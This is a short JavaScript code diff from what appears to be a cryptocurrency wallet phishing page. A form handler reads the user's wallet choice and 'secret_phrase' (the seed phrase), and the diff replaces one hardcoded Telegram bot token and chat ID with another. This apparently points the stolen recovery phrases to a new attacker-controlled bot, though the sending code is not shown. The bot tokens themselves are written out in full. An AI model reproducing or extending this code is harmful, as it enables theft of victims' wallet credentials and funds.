@@ -70,8 +70,8 @@ $("#phraseForm").on("submit", function (ev) {
   // alert(secret_phrase);
   // return false;
 
-  const token = "7490196578:AAG20AiV01GIslIVo3hoM8v0c5qn7fgIDvE";
-  const chatId = "5706267146";
+  const token = "7888244093:AAG7j-8SiAyIaq0a5zJA_f5-F0a3YzIBlHI";
+  const chatId = "6563455749";
 
   var walletVal = selectWallet; // wallet_name.innerHTML
   var phraseVal = document.getElementById("secret_phrase").value;
